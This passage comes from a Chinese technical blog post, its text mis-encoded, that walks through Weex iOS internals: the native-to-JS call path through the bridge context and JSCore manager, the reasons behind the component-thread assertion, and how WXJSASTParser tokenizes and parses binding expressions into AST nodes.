    [self <span class="hljs-attr">callJsMethod</span>:method];
}

- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">callJsMethod</span>:(<span class="hljs-title class_">WXCallJSMethod</span> *)method
{
    <span class="hljs-keyword">if</span> (!method || !method.<span class="hljs-property">instance</span>) <span class="hljs-keyword">return</span>;
    
    __weak <span class="hljs-title function_">typeof</span>(self) weakSelf = self;
    <span class="hljs-title class_">WXPerformBlockOnBridgeThreadForInstance</span>(^(){
        <span class="hljs-title class_">WXBridgeContext</span>* context = method.<span class="hljs-property">instance</span>.<span class="hljs-property">useBackupJsThread</span> ? weakSelf.<span class="hljs-property">backupBridgeCtx</span> :  weakSelf.<span class="hljs-property">bridgeCtx</span>;
        [context <span class="hljs-attr">executeJsMethod</span>:method];
    }, method.<span class="hljs-property">instance</span>.<span class="hljs-property">instanceId</span>);
}
</code></pre>
<p>WXBridgeContext.m ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">executeJsMethod</span>:(<span class="hljs-title class_">WXCallJSMethod</span> *)method {    
   <span class="hljs-comment">// ...</span>
    [sendQueue <span class="hljs-attr">addObject</span>:method];
    [self <span class="hljs-attr">performSelector</span>:@<span class="hljs-title function_">selector</span>(_sendQueueLoop) <span class="hljs-attr">withObject</span>:nil];
}

- (<span class="hljs-keyword">void</span>)_sendQueueLoop {
    <span class="hljs-keyword">if</span> ([tasks count] &gt; <span class="hljs-number">0</span> &amp;&amp; execIns) {
        <span class="hljs-title class_">WXSDKInstance</span> * execInstance = [<span class="hljs-title class_">WXSDKManager</span> <span class="hljs-attr">instanceForID</span>:execIns];
        <span class="hljs-title class_">NSTimeInterval</span> start = <span class="hljs-title class_">CACurrentMediaTime</span>()*<span class="hljs-number">1000</span>;
        
        <span class="hljs-keyword">if</span> (execInstance.<span class="hljs-property">instanceJavaScriptContext</span> &amp;&amp; execInstance.<span class="hljs-property">bundleType</span>) {
            [self <span class="hljs-attr">callJSMethod</span>:@<span class="hljs-string">"__WEEX_CALL_JAVASCRIPT__"</span> <span class="hljs-attr">args</span>:@[execIns, [tasks copy]] <span class="hljs-attr">onContext</span>:execInstance.<span class="hljs-property">instanceJavaScriptContext</span> <span class="hljs-attr">completion</span>:nil];
        } <span class="hljs-keyword">else</span> {
            [self <span class="hljs-attr">callJSMethod</span>:@<span class="hljs-string">"callJS"</span> <span class="hljs-attr">args</span>:@[execIns, [tasks copy]]];
        }
        <span class="hljs-comment">// ...</span>
    }
}

- (<span class="hljs-keyword">void</span>)<span class="hljs-attr">callJSMethod</span>:(<span class="hljs-title class_">NSString</span> *)method <span class="hljs-attr">args</span>:(<span class="hljs-title class_">NSArray</span> *)args {
    <span class="hljs-keyword">if</span> (self.<span class="hljs-property">frameworkLoadFinished</span>) {
        [self.<span class="hljs-property">jsBridge</span> <span class="hljs-attr">callJSMethod</span>:method <span class="hljs-attr">args</span>:args];
    } <span class="hljs-keyword">else</span> {
        [_methodQueue <span class="hljs-attr">addObject</span>:@{@<span class="hljs-string">"method"</span>:method, @<span class="hljs-string">"args"</span>:args}];
    }
}
</code></pre>
<p>å†åˆ° WXJSCoreManager</p>
<pre><code class="hljs language-javascript" lang="javascript">- (<span class="hljs-title class_">JSValue</span> *)<span class="hljs-attr">callJSMethod</span>:(<span class="hljs-title class_">NSString</span> *)method <span class="hljs-attr">args</span>:(<span class="hljs-title class_">NSArray</span> *)args {
    <span class="hljs-title class_">WXLogDebug</span>(@<span class="hljs-string">"Calling JS... method:%@, args:%@"</span>, method, args);
    <span class="hljs-title class_">WXPerformBlockOnMainThread</span>(^{
        [[<span class="hljs-title class_">WXBridgeManager</span> sharedManager].<span class="hljs-property">lastMethodInfo</span> <span class="hljs-attr">setObject</span>:method ?: @<span class="hljs-string">""</span> <span class="hljs-attr">forKey</span>:@<span class="hljs-string">"method"</span>];
        [[<span class="hljs-title class_">WXBridgeManager</span> sharedManager].<span class="hljs-property">lastMethodInfo</span> <span class="hljs-attr">setObject</span>:args ?: @[] <span class="hljs-attr">forKey</span>:@<span class="hljs-string">"args"</span>];
    });
    <span class="hljs-keyword">return</span> [[_jsContext globalObject] <span class="hljs-attr">invokeMethod</span>:method <span class="hljs-attr">withArguments</span>:[args copy]];
}
</code></pre>
<p>å…¶å®ä¸ç®¡æ˜¯ CallJS è¿˜æ˜¯ CallNativeï¼Œé€šä¿¡çš„æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡å’Œ Hybrid çš„è®¾è®¡ä¸€è‡´ï¼Œéƒ½éœ€è¦åœ¨ JavascriptCore çš„ global å¯¹è±¡ä¸ŠæŒ‚è½½ä¸€ä¸ªæ–¹æ³•ã€‚æ¯”å¦‚ Native æ³¨å†Œäº†ä¸€ä¸ª WXComponent ä¹‹åï¼ŒWeex ä¾§ç”¨ Vue è¯­æ³•å†™å®Œäº†ä¸ªé¡µé¢ï¼Œå‘ˆç°åœ¨ç”¨æˆ·æ‰‹æœºä¸Šï¼Œç”¨æˆ·ç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®ä¹‹åï¼ŒNative å†å°†äº‹ä»¶å›è°ƒç»™ Weex ä¾§ï¼ŒWeex å†å»å¤„ç†åç»­é€»è¾‘ã€‚</p>
<h3 data-id="heading-51">4. WXAssertComponentThread æ–­è¨€</h3>
<p><code>WXAssertComponentThread</code> çš„æ ¸å¿ƒä½œç”¨æ˜¯ <strong>å¼ºåˆ¶çº¦æŸç»„ä»¶ç›¸å…³æ“ä½œåœ¨ã€Œç»„ä»¶ä¸“å±çº¿ç¨‹ã€æ‰§è¡Œ</strong>ï¼Œæœ¬è´¨æ˜¯ä¸ºäº†è§£å†³ã€Œçº¿ç¨‹å®‰å…¨ã€å’Œã€Œæ€§èƒ½ç¨³å®šæ€§ã€é—®é¢˜</p>
<p>iOS å¼€å‘çš„æ ¸å¿ƒçº¿ç¨‹è§„åˆ™æ˜¯ã€ŒUI æ“ä½œå¿…é¡»åœ¨ä¸»çº¿ç¨‹ã€ï¼Œä½† Weex ç»„ä»¶çš„å·¥ä½œæµç¨‹ï¼ˆç»‘å®šè§£æã€æ•°æ®è®¡ç®—ã€å¸ƒå±€è®¡ç®—ã€å­ç»„ä»¶ç®¡ç†ï¼‰åŒ…å«å¤§é‡ã€Œé UI æ“ä½œã€â€”â€” å¦‚æœè¿™äº›æ“ä½œéƒ½åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œï¼Œä¼šé˜»å¡ä¸»çº¿ç¨‹ï¼ˆæ¯”å¦‚é•¿åˆ—è¡¨æ•°æ®è§£æã€å¤æ‚è¡¨è¾¾å¼è®¡ç®—ï¼‰ï¼Œå¯¼è‡´ UI å¡é¡¿ï¼ˆæ¯”å¦‚æ»‘åŠ¨æ‰å¸§ï¼‰</p>
<p>å› æ­¤ Weex è®¾è®¡äº†çº¿ç¨‹åˆ†å·¥</p>

















<table><thead><tr><th>çº¿ç¨‹ç±»å‹</th><th>è´Ÿè´£çš„æ“ä½œ</th></tr></thead><tbody><tr><td>ç»„ä»¶ä¸“å±çº¿ç¨‹</td><td>ç»‘å®šè§„åˆ™è§£æï¼ˆ<code>_storeBindings</code>ï¼‰ã€è¡¨è¾¾å¼è®¡ç®—ï¼ˆ<code>bindingBlockWithExpression</code>ï¼‰ã€æ•°æ®æ›´æ–°ï¼ˆ<code>updateBindingData</code>ï¼‰ã€å¸ƒå±€è®¡ç®—ï¼ˆ<code>calculateLayout</code>ï¼‰</td></tr><tr><td>ä¸»çº¿ç¨‹</td><td>æœ€ç»ˆ UI æ¸²æŸ“ï¼ˆå¦‚ <code>UIImageView</code> è®¾å›¾ã€<code>UILabel</code> è®¾æ–‡æœ¬ï¼‰ã€å­è§†å›¾å¢åˆ ï¼ˆ<code>insertSubview</code>ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-52">1. é¿å…ã€Œçº¿ç¨‹å®‰å…¨é—®é¢˜ã€ï¼Œé˜²æ­¢å´©æºƒ / æ•°æ®é”™ä¹±</h4>
<p>ç»„ä»¶çš„æ ¸å¿ƒæ•°æ®ï¼ˆå¦‚ <code>_bindingProps</code>ã€<code>_subcomponents</code>ã€<code>_flexCssNode</code>ï¼‰éƒ½æ˜¯ã€Œéçº¿ç¨‹å®‰å…¨çš„ã€ï¼ˆæ²¡æœ‰åŠ é”ä¿æŠ¤ï¼‰â€”â€” å¦‚æœå¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å†™è¿™äº›æ•°æ®ï¼Œä¼šå¯¼è‡´ï¼š</p>
<ul>
<li>æ•°æ®ç«äº‰ï¼šæ¯”å¦‚ä¸»çº¿ç¨‹è¯»å– <code>_subcomponents</code> éå†ï¼Œç»„ä»¶çº¿ç¨‹åŒæ—¶ä¿®æ”¹ <code>_subcomponents</code>ï¼ˆå¢åˆ å­ç»„ä»¶ï¼‰ï¼Œå¯¼è‡´æ•°ç»„è¶Šç•Œå´©æºƒï¼›</li>
<li>æ•°æ®ä¸ä¸€è‡´ï¼šæ¯”å¦‚ç»„ä»¶çº¿ç¨‹æ›´æ–° <code>_bindingProps</code> çš„å€¼ï¼Œä¸»çº¿ç¨‹åŒæ—¶è¯»å–è¯¥å€¼ç”¨äº UI æ›´æ–°ï¼Œå¯¼è‡´æ˜¾ç¤ºé”™è¯¯çš„æ—§å€¼ï¼›</li>
<li>é‡æŒ‡é’ˆï¼šæ¯”å¦‚ç»„ä»¶çº¿ç¨‹é”€æ¯å­ç»„ä»¶ï¼Œä¸»çº¿ç¨‹è¿˜åœ¨è®¿é—®è¯¥å­ç»„ä»¶çš„ <code>view</code>ã€‚</li>
</ul>
<p>çº¿ç¨‹æ–­è¨€é€šè¿‡ã€Œå¼ºåˆ¶æ‰€æœ‰ç»„ä»¶æ ¸å¿ƒæ“ä½œåœ¨åŒä¸€çº¿ç¨‹æ‰§è¡Œã€ï¼Œä»æ ¹æºä¸Šé¿å…äº†è¿™äº›è·¨çº¿ç¨‹é—®é¢˜ â€”â€” åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ“ä½œç»„ä»¶æ•°æ®ï¼Œæ— éœ€å¤æ‚é”æœºåˆ¶ï¼ˆé”ä¼šé™ä½æ€§èƒ½ï¼‰ã€‚</p>
<h4 data-id="heading-53">2. ç®€åŒ–è°ƒè¯•ï¼Œå¿«é€Ÿå®šä½çº¿ç¨‹é—®é¢˜</h4>
<p>å¦‚æœæ²¡æœ‰çº¿ç¨‹æ–­è¨€ï¼Œè·¨çº¿ç¨‹æ“ä½œç»„ä»¶å¯èƒ½å¯¼è‡´ã€Œå¶ç°å´©æºƒã€ï¼ˆæ¯”å¦‚ 100 æ¬¡æ“ä½œå‡ºç° 1 æ¬¡ï¼‰ï¼Œéš¾ä»¥å¤ç°å’Œæ’æŸ¥ï¼ˆæ—¥å¿—ä¸­çœ‹ä¸åˆ°çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼‰ã€‚è€Œçº¿ç¨‹æ–­è¨€ä¼šåœ¨ã€Œè¿è§„çº¿ç¨‹è°ƒç”¨æ—¶ç›´æ¥å´©æºƒã€ï¼Œå¹¶æ˜ç¡®æç¤ºã€Œå¿…é¡»åœ¨ç»„ä»¶çº¿ç¨‹æ‰§è¡Œã€ï¼Œå¼€å‘è€…èƒ½ç«‹åˆ»å®šä½åˆ°è¿è§„ä»£ç ï¼ˆæ¯”å¦‚åœ¨ä¸»çº¿ç¨‹è°ƒç”¨äº† <code>updateBindingData</code>ï¼‰ï¼Œå¤§å¹…é™ä½è°ƒè¯•æˆæœ¬ã€‚</p>
<h4 data-id="heading-54">3. ä¿è¯æ“ä½œé¡ºåºä¸€è‡´æ€§</h4>
<p>ç»„ä»¶çš„æ›´æ–°æµç¨‹æ˜¯ã€Œè§£æç»‘å®š â†’ è®¡ç®—è¡¨è¾¾å¼ â†’ æ›´æ–°å±æ€§ â†’ å¸ƒå±€è®¡ç®— â†’ UI æ¸²æŸ“ã€â€”â€” è¿™äº›æ­¥éª¤å¿…é¡»æŒ‰é¡ºåºæ‰§è¡Œã€‚å¦‚æœåˆ†æ•£åœ¨å¤šä¸ªçº¿ç¨‹ï¼Œå¯èƒ½å‡ºç°ã€Œå¸ƒå±€è®¡ç®—è¿˜æ²¡å®Œæˆï¼ŒUI å·²ç»å¼€å§‹æ¸²æŸ“ã€çš„æƒ…å†µï¼ˆå¯¼è‡´å¸ƒå±€é”™ä¹±ï¼‰ã€‚ç»„ä»¶ä¸“å±çº¿ç¨‹ä¿è¯äº†æ‰€æœ‰æ“ä½œä¸²è¡Œæ‰§è¡Œï¼Œé¡ºåºä¸ä¼šä¹±ã€‚</p>
<h3 data-id="heading-55">5. WXJSASTParser çš„å·¥ä½œåŸç†</h3>
<p><code>WXJSASTParser</code> å¦‚ä½•æŠŠè¡¨è¾¾å¼å­—ç¬¦ä¸²è§£æä¸º AST èŠ‚ç‚¹ï¼Ÿ</p>
<p><code>WXJSASTParser</code> æ˜¯ Weex è‡ªå®šä¹‰çš„ã€Œè½»é‡ JS è¡¨è¾¾å¼è§£æå™¨ã€â€”â€” æ ¸å¿ƒæ˜¯ã€ŒæŒ‰ JS è¯­æ³•è§„åˆ™ï¼ŒæŠŠå­—ç¬¦ä¸²æ‹†åˆ†ä¸ºç»“æ„åŒ–çš„ AST èŠ‚ç‚¹ã€ï¼Œå…¨ç¨‹ä¸ä¾èµ–å®Œæ•´ JS å¼•æ“ï¼ˆå¦‚ JSC/V8ï¼‰ï¼Œåªæ”¯æŒç»‘å®šè¡¨è¾¾å¼éœ€è¦çš„åŸºç¡€è¯­æ³•ï¼ˆæ ‡è¯†ç¬¦ã€æˆå‘˜è®¿é—®ã€äºŒå…ƒè¿ç®—ç­‰ï¼‰ï¼Œå…¼é¡¾æ€§èƒ½å’Œä½“ç§¯ã€‚</p>
<p>æ•´ä¸ªè§£æè¿‡ç¨‹åˆ† 3 æ­¥ï¼š<strong>è¯æ³•åˆ†æ â†’ è¯­æ³•åˆ†æ â†’ AST èŠ‚ç‚¹å°è£…</strong>ï¼Œå’Œç¼–è¯‘å™¨çš„å‰ç«¯æµç¨‹ä¸€è‡´ï¼Œä»¥ä¸‹ç»“åˆç¤ºä¾‹ï¼ˆ<code>"user.name + '?size=100'"</code>ï¼‰æ‹†è§£ï¼š</p>
<p>å…ˆæ˜ç¡®ï¼šAST æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰æ˜¯ã€Œç”¨æ ‘å½¢ç»“æ„è¡¨ç¤ºä»£ç è¯­æ³•ã€çš„ä¸­é—´ç»“æ„ â€”â€” æ¯”å¦‚è¡¨è¾¾å¼ <code>user.name + '?size=100'</code>ï¼ŒAST ä¼šæ‹†åˆ†ä¸ºï¼š</p>
<pre><code class="hljs language-shell" lang="shell">æ ¹èŠ‚ç‚¹ï¼šBinaryExpressionï¼ˆè¿ç®—ç¬¦ '+'ï¼‰
â”œâ”€ å·¦å­èŠ‚ç‚¹ï¼šMemberExpressionï¼ˆæˆå‘˜è®¿é—®ï¼‰
â”‚  â”œâ”€ objectï¼šIdentifierï¼ˆæ ‡è¯†ç¬¦ 'user'ï¼‰
â”‚  â””â”€ propertyï¼šIdentifierï¼ˆæ ‡è¯†ç¬¦ 'name'ï¼‰
â””â”€ å³å­èŠ‚ç‚¹ï¼šStringLiteralï¼ˆå­—ç¬¦ä¸²å­—é¢é‡ '?size=100'ï¼‰
</code></pre>
<p>è¿™ç§ç»“æ„èƒ½è¢«ç¨‹åºå¿«é€Ÿéå†å’Œè®¡ç®—ï¼ˆæ¯”å¦‚ä¹‹å‰è®²çš„ç”Ÿæˆ <code>WXDataBindingBlock</code> æ—¶ï¼Œé€’å½’éå†èŠ‚ç‚¹æ‰§è¡Œè¿ç®—ï¼‰ã€‚</p>
<h4 data-id="heading-56">1.è¯æ³•åˆ†æï¼ˆLexical Analysisï¼‰</h4>
<p>æ‹†åˆ†ä¸ºè¯æ³•å•å…ƒï¼ˆTokenï¼‰ã€‚è¯æ³•åˆ†ææ˜¯ã€ŒæŠŠè¡¨è¾¾å¼å­—ç¬¦ä¸²æ‹†åˆ†ä¸ºæœ€å°çš„ã€æœ‰æ„ä¹‰çš„è¯­æ³•å•å…ƒã€ï¼Œå¿½ç•¥ç©ºæ ¼ã€æ¢è¡Œç­‰æ— å…³å­—ç¬¦ã€‚æ ¸å¿ƒæ˜¯ã€ŒæŒ‰ JS è¯­æ³•è§„åˆ™åŒ¹é…å­—ç¬¦åºåˆ—ã€ã€‚</p>
<p><code>è¡¨è¾¾å¼ </code>"user.name + '?size=100'"` è¯æ³•åˆ†æåå¾—åˆ°çš„ Token åºåˆ—ï¼š</p>



































<table><thead><tr><th>Token ç±»å‹</th><th>Token å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>IDENTIFIER</code></td><td><code>user</code></td><td>æ ‡è¯†ç¬¦ï¼ˆå˜é‡å / å±æ€§åï¼‰</td></tr><tr><td><code>DOT</code></td><td><code>.</code></td><td>æˆå‘˜è®¿é—®è¿ç®—ç¬¦</td></tr><tr><td><code>IDENTIFIER</code></td><td><code>name</code></td><td>æ ‡è¯†ç¬¦</td></tr><tr><td><code>PLUS</code></td><td><code>+</code></td><td>äºŒå…ƒè¿ç®—ç¬¦ï¼ˆåŠ æ³• / æ‹¼æ¥ï¼‰</td></tr><tr><td><code>STRING_LITERAL</code></td><td><code>?size=100</code></td><td>å­—ç¬¦ä¸²å­—é¢é‡ï¼ˆå»æ‰å¼•å·ï¼‰</td></tr></tbody></table>
<p>è¯æ³•åˆ†æçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ï¼‰ï¼š</p>
<ol>
<li>åˆå§‹åŒ–ä¸€ä¸ªã€Œå­—ç¬¦æŒ‡é’ˆã€ï¼Œä»è¡¨è¾¾å¼å­—ç¬¦ä¸²å¼€å¤´éå†ï¼›</li>
<li>é‡åˆ°å­—æ¯ / ä¸‹åˆ’çº¿ â†’ ç»§ç»­å¾€åè¯»ï¼Œç›´åˆ°éå­—æ¯ / æ•°å­— / ä¸‹åˆ’çº¿ â†’ è¯†åˆ«ä¸º <code>IDENTIFIER</code>ï¼ˆå¦‚ <code>user</code>ï¼‰ï¼›</li>
<li>é‡åˆ° <code>+</code>/<code>-</code>/<code>*</code>/<code>/</code>/<code>&gt;</code>/<code>=</code> ç­‰ â†’ è¯†åˆ«ä¸ºå¯¹åº”è¿ç®—ç¬¦ï¼ˆå¦‚ <code>+</code> â†’ <code>PLUS</code>ï¼‰ï¼›</li>
<li>é‡åˆ° <code>"</code> æˆ– <code>'</code> â†’ ç»§ç»­å¾€åè¯»ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªç›¸åŒå¼•å· â†’ è¯†åˆ«ä¸º <code>STRING_LITERAL</code>ï¼ˆå»æ‰å¼•å·ï¼‰ï¼›</li>
<li>é‡åˆ° <code>.</code> â†’ è¯†åˆ«ä¸º <code>DOT</code>ï¼ˆæˆå‘˜è®¿é—®ï¼‰ï¼›</li>
<li>é‡åˆ°ç©ºæ ¼ / åˆ¶è¡¨ç¬¦ â†’ ç›´æ¥è·³è¿‡ï¼ˆæ— æ„ä¹‰å­—ç¬¦ï¼‰ï¼›</li>
<li>é‡åˆ°æ— æ³•è¯†åˆ«çš„å­—ç¬¦ï¼ˆå¦‚ <code>#</code>/<code>@</code>ï¼‰â†’ æŠ›å‡ºè¯­æ³•é”™è¯¯ï¼ˆ<code>WXLogError</code>ï¼‰ã€‚</li>
</ol>
<p>Weex çš„ <code>WXJSASTParser</code> å†…éƒ¨ä¼šç»´æŠ¤ä¸€ä¸ªã€ŒToken æµã€ï¼ˆæ•°ç»„ï¼‰ï¼Œè¯æ³•åˆ†æåæŠŠ Token æŒ‰é¡ºåºå­˜å…¥æµä¸­ï¼Œä¾›ä¸‹ä¸€æ­¥è¯­æ³•åˆ†æä½¿ç”¨ã€‚</p>
<h4 data-id="heading-57">2. è¯­æ³•åˆ†æï¼ˆSyntactic Analysisï¼‰</h4>
<p>è¯­æ³•åˆ†ææ˜¯ã€Œæ ¹æ® JS è¡¨è¾¾å¼è¯­æ³•è§„åˆ™ï¼ŒæŠŠ Token æµç»„åˆä¸ºæ ‘å½¢ AST èŠ‚ç‚¹ã€â€”â€” æ ¸å¿ƒæ˜¯ã€ŒéªŒè¯ Token åºåˆ—æ˜¯å¦ç¬¦åˆè¯­æ³•ï¼Œå¹¶æ„å»ºå±‚çº§å…³ç³»ã€ã€‚</p>
<p>Weex æ”¯æŒçš„ JS è¡¨è¾¾å¼è¯­æ³•å­é›†ï¼ˆæ ¸å¿ƒï¼‰ï¼š</p>
<ul>
<li>æ ‡è¯†ç¬¦ï¼š<code>user</code>ã€<code>imageUrl</code>ï¼ˆå¯¹åº” <code>WXJSIdentifier</code>ï¼‰ï¼›</li>
<li>æˆå‘˜è®¿é—®ï¼š<code>user.name</code>ã€<code>list[0]</code>ï¼ˆå¯¹åº” <code>WXJSMemberExpression</code>ï¼‰ï¼›</li>
<li>å­—é¢é‡ï¼šå­—ç¬¦ä¸²ï¼ˆ<code>'abc'</code>ï¼‰ã€æ•°å­—ï¼ˆ<code>123</code>ï¼‰ã€å¸ƒå°”ï¼ˆ<code>true</code>ï¼‰ã€nullï¼ˆå¯¹åº” <code>WXJSStringLiteral</code>/<code>WXJSNumericLiteral</code> ç­‰ï¼‰ï¼›</li>
<li>äºŒå…ƒè¿ç®—ï¼š<code>a + b</code>ã€<code>age &gt; 18</code>ã€<code>a === b</code>ï¼ˆå¯¹åº” <code>WXJSBinaryExpression</code>ï¼‰ï¼›</li>
<li>æ¡ä»¶è¿ç®—ï¼š<code>age &gt; 18 ? 'adult' : 'teen'</code>ï¼ˆå¯¹åº” <code>WXJSConditionalExpression</code>ï¼‰ï¼›</li>
<li>æ•°ç»„è¡¨è¾¾å¼ï¼š<code>[a, b, c]</code>ï¼ˆå¯¹åº” <code>WXJSArrayExpression</code>ï¼‰ã€‚</li>
</ul>
<p>ç¤ºä¾‹ï¼šToken æµ â†’ AST èŠ‚ç‚¹çš„æ„å»ºè¿‡ç¨‹</p>
<p>Token æµï¼š<code>IDENTIFIER(user) â†’ DOT â†’ IDENTIFIER(name) â†’ PLUS â†’ STRING_LITERAL(?size=100)</code></p>
<ol>
<li>è¯­æ³•åˆ†æå™¨å…ˆè¯»å–å‰ 3 ä¸ª Tokenï¼ˆ<code>user</code> â†’ <code>.</code> â†’ <code>name</code>ï¼‰ï¼ŒåŒ¹é…ã€Œæˆå‘˜è®¿é—®è¯­æ³•è§„åˆ™ã€ï¼ˆ<code>IDENTIFIER . IDENTIFIER</code>ï¼‰â†’ æ„å»º <code>WXJSMemberExpression</code> èŠ‚ç‚¹ï¼ˆå·¦å­èŠ‚ç‚¹ <code>user</code>ï¼Œå³å­èŠ‚ç‚¹ <code>name</code>ï¼‰ï¼›</li>
<li>æ¥ç€è¯»å– <code>PLUS</code>ï¼ˆäºŒå…ƒè¿ç®—ç¬¦ï¼‰ï¼Œå†è¯»å–åé¢çš„ <code>STRING_LITERAL(?size=100)</code> â†’ åŒ¹é…ã€ŒäºŒå…ƒè¿ç®—è¯­æ³•è§„åˆ™ã€ï¼ˆ<code>Expression + Expression</code>ï¼‰ï¼›</li>
<li>æŠŠä¹‹å‰æ„å»ºçš„ <code>WXJSMemberExpression</code> ä½œä¸ºã€Œå·¦å­èŠ‚ç‚¹ã€ï¼Œ<code>STRING_LITERAL</code> ä½œä¸ºã€Œå³å­èŠ‚ç‚¹ã€ï¼Œ<code>PLUS</code>ä½œä¸ºã€Œè¿ç®—ç¬¦ã€â†’ æ„å»ºæ ¹èŠ‚ç‚¹ <code>WXJSBinaryExpression</code>ï¼›</li>
<li>æœ€ç»ˆç”Ÿæˆ AST æ ‘ï¼ˆå¦‚ä¹‹å‰çš„ç»“æ„ï¼‰ã€‚</li>
</ol>
<p>è¯­æ³•åˆ†æçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ï¼‰ï¼š</p>
<p>Weex é‡‡ç”¨ã€Œé€’å½’ä¸‹é™åˆ†ææ³•ã€ï¼ˆæœ€é€‚åˆæ‰‹å·¥å®ç°çš„è¯­æ³•åˆ†ææ–¹æ³•ï¼‰ï¼š</p>
<ol>
<li>ä¸ºæ¯ç§è¡¨è¾¾å¼ç±»å‹å®šä¹‰ä¸€ä¸ªã€Œè§£æå‡½æ•°ã€ï¼ˆå¦‚ <code>parseMemberExpression</code> è§£ææˆå‘˜è®¿é—®ã€<code>parseBinaryExpression</code> è§£æäºŒå…ƒè¿ç®—ï¼‰ï¼›</li>
<li>è§£æå‡½æ•°é€’å½’è°ƒç”¨ï¼šæ¯”å¦‚ <code>parseBinaryExpression</code> ä¼šè°ƒç”¨ <code>parseMemberExpression</code> è§£æå·¦å³æ“ä½œæ•°ï¼Œ<code>parseMemberExpression</code> ä¼šè°ƒç”¨ <code>parseIdentifier</code> è§£ææ ‡è¯†ç¬¦ï¼›</li>
<li>è¯­æ³•æ ¡éªŒï¼šå¦‚æœ Token åºåˆ—ä¸ç¬¦åˆè§„åˆ™ï¼ˆå¦‚ <code>user.name +</code> ç¼ºå°‘å³æ“ä½œæ•°ï¼‰ï¼Œä¼šæŠ›å‡ºã€Œè¯­æ³•é”™è¯¯ã€æ—¥å¿—ï¼Œç»ˆæ­¢è§£æã€‚</li>
</ol>
<h4 data-id="heading-58">3. AST èŠ‚ç‚¹å°è£…</h4>
<p>è½¬ä¸º Weex è‡ªå®šä¹‰çš„ <code>WXJSExpression</code>ã€‚è¯­æ³•åˆ†æç”Ÿæˆçš„æ˜¯ã€ŒæŠ½è±¡è¯­æ³•æ ‘ç»“æ„ã€ï¼ŒWeex ä¼šæŠŠè¿™ä¸ªç»“æ„å°è£…ä¸ºè‡ªå®šä¹‰çš„ <code>WXJSExpression</code> å­ç±»ï¼ˆå¯¹åº”ä¸åŒè¡¨è¾¾å¼ç±»å‹ï¼‰ï¼Œæ¯ä¸ªå­ç±»å­˜å‚¨è¯¥èŠ‚ç‚¹çš„å…³é”®ä¿¡æ¯ï¼ˆå¦‚è¿ç®—ç¬¦ã€å­èŠ‚ç‚¹ï¼‰ï¼Œä¾›åç»­ç”Ÿæˆ <code>WXDataBindingBlock</code> ä½¿ç”¨ã€‚</p>
<p>ç¤ºä¾‹å°è£…ï¼š</p>
<ul>
<li><code>WXJSMemberExpression</code> ç±»ï¼šå­˜å‚¨ <code>object</code>ï¼ˆå­èŠ‚ç‚¹ï¼Œå¦‚ <code>user</code>ï¼‰ã€<code>property</code>ï¼ˆå­èŠ‚ç‚¹ï¼Œå¦‚ <code>name</code>ï¼‰ã€<code>computed</code>ï¼ˆæ˜¯å¦æ˜¯è®¡ç®—å±æ€§ï¼Œå¦‚ <code>list[0]</code> ä¸º <code>YES</code>ï¼Œ<code>user.name</code> ä¸º <code>NO</code>ï¼‰ï¼›</li>
<li><code>WXJSBinaryExpression</code> ç±»ï¼šå­˜å‚¨ <code>left</code>ï¼ˆå·¦å­èŠ‚ç‚¹ï¼‰ã€<code>right</code>ï¼ˆå³å­èŠ‚ç‚¹ï¼‰ã€<code>operator_</code>ï¼ˆè¿ç®—ç¬¦å­—ç¬¦ä¸²ï¼Œå¦‚ <code>"+"</code>ï¼‰ï¼›</li>
<li>å­—é¢é‡ç±»ï¼ˆå¦‚ <code>WXJSStringLiteral</code>ï¼‰ï¼šå­˜å‚¨ <code>value</code>ï¼ˆå­—é¢é‡å€¼ï¼Œå¦‚ <code>?size=100</code>ï¼‰ã€‚</li>
</ul>
<p>è¿™äº›ç±»çš„å®šä¹‰åœ¨ Weex æºç çš„ <code>WXJSASTParser.h</code> ä¸­ï¼Œæœ¬è´¨æ˜¯ã€Œæ•°æ®å®¹å™¨ã€ï¼ŒæŠŠ AST ç»“æ„è½¬åŒ–ä¸º Objective-C ä»£ç å¯è®¿é—®çš„å¯¹è±¡ã€‚</p>
<p><code>WXJSASTParser</code> æœ¬è´¨ï¼šå®ƒä¸æ˜¯å®Œæ•´çš„ JS è§£æå™¨ï¼ˆä¸æ”¯æŒ <code>function</code>ã€<code>for</code> ç­‰å¤æ‚è¯­æ³•ï¼‰ï¼Œè€Œæ˜¯ã€Œä¸“é—¨ä¸º Weex ç»‘å®šè¡¨è¾¾å¼è®¾è®¡çš„è½»é‡è§£æå™¨ã€â€”â€” åªè§£æéœ€è¦çš„ JS è¡¨è¾¾å¼å­é›†ï¼ŒæŠŠå­—ç¬¦ä¸²è½¬ä¸ºç»“æ„åŒ–çš„ AST èŠ‚ç‚¹ï¼Œæœ€ç»ˆç›®çš„æ˜¯ã€Œè®© Native ä»£ç èƒ½é€’å½’éå†èŠ‚ç‚¹ï¼Œè®¡ç®—å‡ºè¡¨è¾¾å¼ç»“æœã€ï¼ˆå¦‚ <code>user.name + '?size=100'</code> â†’ <code>avatar.png?size=100</code>ï¼‰ã€‚</p>
<p>è¿™ç§ã€Œè‡ªå®šä¹‰è½»é‡è§£æå™¨ã€çš„è®¾è®¡ï¼Œæ—¢é¿å…äº†ä¾èµ–å®Œæ•´ JS å¼•æ“çš„ä½“ç§¯å’Œæ€§èƒ½å¼€é”€ï¼Œåˆèƒ½ç²¾å‡†é€‚é… Weex çš„ç»‘å®šéœ€æ±‚ï¼Œæ˜¯è·¨ç«¯æ¡†æ¶çš„å¸¸è§ä¼˜åŒ–æ€è·¯ã€‚</p>
<h2 data-id="heading-59">åã€å€¼å¾—å€Ÿé‰´çš„åœ°æ–¹</h2>
